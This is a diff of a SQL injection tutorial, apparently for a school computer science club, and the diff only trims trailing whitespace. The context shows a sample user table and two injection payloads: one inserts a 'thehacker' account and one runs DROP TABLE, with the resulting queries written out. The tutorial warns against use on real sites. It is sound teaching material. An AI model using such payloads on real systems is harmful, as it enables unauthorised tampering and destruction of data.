@@ -15,7 +15,7 @@ New Lesson, New Table
 The last lesson's table is not realistic enough for the purpose of this lesson. I mean, who would actually make a table like that (aside from me)? Let's create a new database called tutorial_2 and a table named userinfo. The data below shows the structure of the table.
 
 ID |  Username    |  Password       |  Email
----| -----------  |  -------------  |  ---------------------- 
+---| -----------  |  -------------  |  ----------------------
 1  |   kbarr96    |   iamzbarr      |   kbarr@gmail.com
 2  |   bobbyluig  |   123456        |   bobbyluig@hotmail.com
 3  |   mark17     |   F341CK29fjqq  |   markdark17@aol.com
@@ -104,7 +104,7 @@ So far, we've only discussed how to recon for information. What if we wanted to 
 '; INSERT INTO userinfo ('Username', 'Password', 'Email') VALUES ('thehacker', '2kvLXCR', 'ugot@hacked.com'); #
 
 2) Deleting everything
-'; DROP TABLE userinfo; # 
+'; DROP TABLE userinfo; #
 ```
 
 The resultant queries:
@@ -114,7 +114,7 @@ The resultant queries:
 SELECT Email FROM userinfo WHERE Username=''; INSERT INTO userinfo ('Username', 'Password', 'Email') VALUES ('thehacker', '2kvLXCR', 'ugot@hacked.com'); #'
 
 # 2)
-SELECT Email FROM userinfo WHERE Username=''; DROP TABLE userinfo; #' 
+SELECT Email FROM userinfo WHERE Username=''; DROP TABLE userinfo; #'
 ```
 
 You can see how dangerous and malicious this is. Please DO NOT try this on actual websites. However, you do have full permission to engage CAMS CSC servers in any way you like.
